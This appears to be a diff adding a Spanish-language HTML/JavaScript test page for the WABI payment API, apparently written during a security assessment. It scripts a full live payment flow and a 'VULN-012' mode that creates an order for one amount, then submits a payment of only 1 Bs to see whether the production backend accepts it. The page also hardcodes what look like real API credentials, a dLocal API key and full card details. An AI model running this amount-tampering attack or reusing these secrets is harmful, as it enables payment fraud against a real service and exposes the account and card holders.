@@ -1,0 +1,379 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>WABI Payment Flow Test</title>
+  <style>
+    body {
+      font-family: 'Courier New', monospace;
+      background: #1e1e1e;
+      color: #d4d4d4;
+      padding: 20px;
+      max-width: 1200px;
+      margin: 0 auto;
+    }
+    h1 {
+      color: #4ec9b0;
+      border-bottom: 2px solid #4ec9b0;
+      padding-bottom: 10px;
+    }
+    .container {
+      background: #252526;
+      border-radius: 8px;
+      padding: 20px;
+      margin: 20px 0;
+    }
+    button {
+      background: #0e639c;
+      color: white;
+      border: none;
+      padding: 12px 24px;
+      font-size: 16px;
+      cursor: pointer;
+      border-radius: 4px;
+      margin: 5px;
+      font-family: inherit;
+    }
+    button:hover {
+      background: #1177bb;
+    }
+    button:disabled {
+      background: #666;
+      cursor: not-allowed;
+    }
+    .log {
+      background: #1e1e1e;
+      border: 1px solid #3c3c3c;
+      border-radius: 4px;
+      padding: 15px;
+      margin: 10px 0;
+      max-height: 500px;
+      overflow-y: auto;
+      font-size: 13px;
+      line-height: 1.6;
+    }
+    .success { color: #4ec9b0; }
+    .error { color: #f48771; }
+    .warning { color: #dcdcaa; }
+    .info { color: #569cd6; }
+    .highlight { color: #c586c0; font-weight: bold; }
+    pre {
+      background: #1e1e1e;
+      border-left: 3px solid #569cd6;
+      padding: 10px;
+      overflow-x: auto;
+      margin: 10px 0;
+    }
+    .card-input {
+      background: #3c3c3c;
+      border: 1px solid #569cd6;
+      color: #d4d4d4;
+      padding: 8px;
+      margin: 5px 0;
+      border-radius: 4px;
+      font-family: inherit;
+      width: 100%;
+      box-sizing: border-box;
+    }
+    .input-group {
+      margin: 15px 0;
+    }
+    label {
+      display: block;
+      color: #4ec9b0;
+      margin-bottom: 5px;
+      font-weight: bold;
+    }
+  </style>
+</head>
+<body>
+  <h1>🔐 WABI Payments - Test de Flujo Completo</h1>
+
+  <div class="container">
+    <h2>⚙️ Configuración</h2>
+    <div class="input-group">
+      <label>Tarjeta (PAN):</label>
+      <input type="text" class="card-input" id="cardNumber" value="4218284015172877" placeholder="4111111111111111">
+    </div>
+    <div class="input-group">
+      <label>Mes de expiración (MM):</label>
+      <input type="text" class="card-input" id="expMonth" value="07" placeholder="12">
+    </div>
+    <div class="input-group">
+      <label>Año de expiración (YYYY):</label>
+      <input type="text" class="card-input" id="expYear" value="2029" placeholder="2029">
+    </div>
+    <div class="input-group">
+      <label>CVV:</label>
+      <input type="text" class="card-input" id="cvv" value="007" placeholder="123">
+    </div>
+    <div class="input-group">
+      <label>Teléfono a recargar:</label>
+      <input type="text" class="card-input" id="phone" value="69320910" placeholder="69320910">
+    </div>
+    <div class="input-group">
+      <label>Monto (Bs):</label>
+      <input type="number" class="card-input" id="amount" value="10" step="0.01" min="1">
+    </div>
+  </div>
+
+  <div class="container">
+    <h2>🚀 Acciones</h2>
+    <button onclick="runFullTest(false)">▶️ Ejecutar Test (Monto Normal)</button>
+    <button onclick="runFullTest(true)" style="background: #f48771;">⚠️ Test VULN-012 (Manipular Monto a 1 Bs)</button>
+    <button onclick="clearLog()">🗑️ Limpiar Log</button>
+  </div>
+
+  <div class="container">
+    <h2>📋 Log de Ejecución</h2>
+    <div class="log" id="log"></div>
+  </div>
+
+  <script>
+    let globalData = {};
+
+    function log(message, type = 'info') {
+      const logDiv = document.getElementById('log');
+      const timestamp = new Date().toLocaleTimeString();
+      const colors = {
+        info: 'info',
+        success: 'success',
+        error: 'error',
+        warning: 'warning',
+        highlight: 'highlight'
+      };
+      logDiv.innerHTML += `<div class="${colors[type]}">[${timestamp}] ${message}</div>`;
+      logDiv.scrollTop = logDiv.scrollHeight;
+    }
+
+    function logJSON(obj, title = '') {
+      if (title) log(title, 'highlight');
+      document.getElementById('log').innerHTML += `<pre>${JSON.stringify(obj, null, 2)}</pre>`;
+    }
+
+    function clearLog() {
+      document.getElementById('log').innerHTML = '';
+    }
+
+    async function runFullTest(manipulateAmount = false) {
+      clearLog();
+      log('═══════════════════════════════════════════════════════', 'highlight');
+      log('🚀 Iniciando test de flujo de pago WABI', 'highlight');
+      if (manipulateAmount) {
+        log('⚠️  MODO: Test de manipulación de monto (VULN-012)', 'warning');
+      }
+      log('═══════════════════════════════════════════════════════', 'highlight');
+
+      try {
+        // PASO 1: Autenticar
+        log('\n[PASO 1] Autenticando con AWS Cognito...', 'info');
+        const authResp = await fetch('https://api.wabi.com.bo/v1/transaction/generateToken', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            username: '076f7a740acf31cf9b111d4e',
+            password: '0b194b147ef825c3d1281338'
+          })
+        });
+        const authData = await authResp.json();
+        globalData.token = authData.token;
+        log('✓ Token JWT obtenido (' + authData.token.length + ' chars)', 'success');
+
+        // PASO 2: Crear transacción
+        log('\n[PASO 2] Creando transacción...', 'info');
+        const txResp = await fetch('https://api.wabi.com.bo/v1/transaction/create', {
+          method: 'POST',
+          headers: {
+            'Authorization': `Bearer ${globalData.token}`,
+            'Content-Type': 'application/json'
+          },
+          body: JSON.stringify({ agency_id: 2, plattform_id: 12 })
+        });
+        const transaction = await txResp.json();
+        globalData.transactionId = transaction.id;
+        globalData.encryptedId = transaction.transaction_id_encrypted;
+        log(`✓ Transacción creada: ${transaction.id}`, 'success');
+        log(`  Encrypted ID: ${transaction.transaction_id_encrypted}`, 'info');
+
+        // PASO 3: Crear orden de pago
+        const orderAmount = parseFloat(document.getElementById('amount').value);
+        log(`\n[PASO 3] Creando orden de pago (${orderAmount} Bs Tigo Prepago)...`, 'info');
+
+        const phone = document.getElementById('phone').value;
+        const additionalCommerce = {
+          account: phone,
+          service: '11',
+          sub_service: 'SINTESIS_TELECEL_PREPAGO',
+          items: [{ code: '0001', amount: orderAmount, description: 'Monto a Recargar' }],
+          first_name: 'Juan',
+          last_name: 'Perez',
+          nitFac: '12345678',
+          nombreFac: 'Juan Perez',
+          typeDocument: '1'
+        };
+
+        const orderResp = await fetch('https://api.wabi.com.bo/v1/core/order-payment/create', {
+          method: 'POST',
+          headers: {
+            'Authorization': `Bearer ${globalData.token}`,
+            'Content-Type': 'application/json'
+          },
+          body: JSON.stringify({
+            transaction_id: transaction.id,
+            description: 'Pago de Servicio Síntesis',
+            service_code: 'SINTESIS_TELECEL_PREPAGO',
+            debtor_first_name: 'Juan',
+            debtor_last_name: 'Perez',
+            debtor_phone: '',
+            debtor_ci_code: '12345678',
+            invoice_name: 'Juan Perez',
+            invoice_type: '1',
+            invoice_document_number: '12345678',
+            additional_data: '{}',
+            additional_commerce: JSON.stringify(additionalCommerce),
+            is_billable: 1,
+            amount: { currency: 'Bs', value: orderAmount.toFixed(2) },
+            items: [{
+              description: 'Monto a Recargar',
+              unit_price: orderAmount.toFixed(2),
+              quantity: '1',
+              discount: '0.00',
+              detail_type: '1'
+            }]
+          })
+        });
+        const orderPayment = await orderResp.json();
+        globalData.orderPaymentId = orderPayment.id;
+        log(`✓ Orden de pago creada: ${orderPayment.id}`, 'success');
+
+        // PASO 4: Tokenizar tarjeta
+        log('\n[PASO 4] Tokenizando tarjeta con dLocal...', 'info');
+        const cardNumber = document.getElementById('cardNumber').value;
+        const expMonth = parseInt(document.getElementById('expMonth').value);
+        const expYear = parseInt(document.getElementById('expYear').value);
+        const cvv = document.getElementById('cvv').value;
+
+        log(`  Tarjeta: ${cardNumber.slice(0, 4)}...${cardNumber.slice(-4)}`, 'info');
+
+        const tokenResp = await fetch('https://ppmcc.dlocal.com/v1/tokens', {
+          method: 'POST',
+          headers: {
+            'X-API-Key': '3173e25d-501e-4189-aed1-9a7bfac64f30',
+            'Content-Type': 'application/json'
+          },
+          body: JSON.stringify({
+            holder_name: 'JUAN PEREZ',
+            card_number: cardNumber,
+            cvv: cvv,
+            expiration_month: expMonth,
+            expiration_year: expYear,
+            type: 'card'
+          })
+        });
+
+        const tokenData = await tokenResp.json();
+        globalData.cardToken = tokenData.token || tokenData.id;
+        log(`✓ Tarjeta tokenizada: ${globalData.cardToken}`, 'success');
+
+        // PASO 5: PROCESAR PAGO
+        log('\n═══════════════════════════════════════════════════════', 'highlight');
+        log('[PASO 5] PROCESANDO PAGO - update-payment', 'highlight');
+        log('═══════════════════════════════════════════════════════', 'highlight');
+
+        // Determinar monto a enviar
+        const paymentAmount = manipulateAmount ? 1 : orderAmount;
+
+        if (manipulateAmount) {
+          log(`⚠️  MANIPULACIÓN: Orden es de ${orderAmount} Bs, pero pagaremos ${paymentAmount} Bs`, 'warning');
+        }
+
+        const paymentPayload = {
+          transaction_id: parseInt(globalData.transactionId),
+          transaction_id_encrypted: globalData.encryptedId,
+          payment_id: globalData.orderPaymentId,
+          amount: {
+            currency: 'Bs.',
+            value: paymentAmount
+          },
+          token: globalData.cardToken,
+          titular_name: 'JUAN PEREZ',
+          payment_method: { type: 'CARD_PAYMENT' }
+        };
+
+        logJSON(paymentPayload, 'Payload enviado:');
+
+        const paymentResp = await fetch('https://api.wabi.com.bo/v1/payment/card-payment/update-payment', {
+          method: 'POST',
+          headers: {
+            'Authorization': `Bearer ${globalData.token}`,
+            'Content-Type': 'application/json'
+          },
+          body: JSON.stringify(paymentPayload)
+        });
+
+        const paymentResult = await paymentResp.json();
+
+        log('\n═══════════════════════════════════════════════════════', 'highlight');
+        log('✅ RESPUESTA DE update-payment RECIBIDA', 'success');
+        log('═══════════════════════════════════════════════════════', 'highlight');
+
+        logJSON(paymentResult, '');
+
+        // Analizar respuesta
+        const statusCode = paymentResult.status_code || paymentResult.additionalData?.status_code;
+        const statusDetail = paymentResult.status_detail || paymentResult.additionalData?.status_detail;
+
+        log('\n📊 ANÁLISIS DE RESPUESTA:', 'highlight');
+        log(`  Status: ${paymentResult.status}`, 'info');
+        log(`  Status Code: ${statusCode}`, 'info');
+        log(`  Detail: ${statusDetail}`, 'info');
+        log(`  Payment ID: ${paymentResult.paymentId}`, 'info');
+        log(`  Amount: ${paymentResult.amount} ${paymentResult.currency}`, 'info');
+
+        if (paymentResult.card) {
+          log(`  Tarjeta: ${paymentResult.card.brand} ...${paymentResult.card.last4}`, 'info');
+        }
+
+        // Interpretar resultado
+        log('\n🔍 INTERPRETACIÓN:', 'highlight');
+
+        const statusMeanings = {
+          '100': '⏳ PENDING - El pago está pendiente',
+          '200': '✅ PAID - El pago fue exitoso',
+          '300': '❌ REJECTED - El pago fue rechazado',
+          '302': '❌ REJECTED - Monto insuficiente (Insufficient amount)',
+          '600': '✅ AUTHORIZED - El pago fue autorizado',
+          '700': '✅ VERIFIED - El pago fue verificado'
+        };
+
+        const meaning = statusMeanings[statusCode] || `❓ Código ${statusCode} desconocido`;
+        log(meaning, statusCode === '200' || statusCode === '600' || statusCode === '700' ? 'success' : 'warning');
+
+        // Analizar VULN-012
+        if (manipulateAmount) {
+          log('\n⚠️  ANÁLISIS DE VULN-012:', 'warning');
+          if (statusCode === '302') {
+            log('✅ BACKEND VALIDA CORRECTAMENTE:', 'success');
+            log('   El servidor detectó que el monto enviado (1 Bs) no coincide con la orden (' + orderAmount + ' Bs)', 'success');
+            log('   VULNERABILIDAD: NO CONFIRMADA ✅', 'success');
+          } else if (statusCode === '200' || statusCode === '600') {
+            log('❌ VULNERABILIDAD CRÍTICA CONFIRMADA:', 'error');
+            log('   El pago fue APROBADO con monto manipulado!', 'error');
+            log('   Orden: ' + orderAmount + ' Bs, Pagado: 1 Bs', 'error');
+            log('   VULNERABILIDAD: CONFIRMADA ❌', 'error');
+          } else {
+            log('❓ Resultado inconcluso - revisar status code: ' + statusCode, 'warning');
+          }
+        }
+
+        log('\n✨ Test completado exitosamente', 'success');
+
+      } catch (error) {
+        log('\n❌ ERROR: ' + error.message, 'error');
+        console.error(error);
+      }
+    }
+  </script>
+</body>
+</html>
